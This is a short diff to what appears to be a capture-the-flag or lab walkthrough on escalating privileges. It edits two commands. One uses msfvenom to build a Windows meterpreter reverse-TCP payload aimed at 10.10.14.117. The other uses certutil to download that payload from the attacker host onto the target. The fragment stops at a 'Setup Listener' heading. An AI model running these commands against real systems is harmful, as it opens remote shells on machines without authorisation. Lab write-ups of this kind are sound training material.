@@ -66,12 +66,12 @@ We will have to elevate our privileges and get a proper shell on the target, let
 ## 1. Create a PAYLOAD using MSFVenom
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.117 LPORT=7777 -f exe -o reverse.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.117 LPORT=4444 -f psh -o payload.ps1
 ```
 ## 2. Transfer the Payload to the target (certutil)
 
 ```bash
-certutil.exe -urlcache -f http://10.10.14.117:8080/SHELL_ATTACK.exe SHELL_ATTACK.exe
+certutil.exe -urlcache -f http://10.10.14.117:8080/payload.ps1 payload.ps1
 ```
 ## 3. Setup Listener 
 
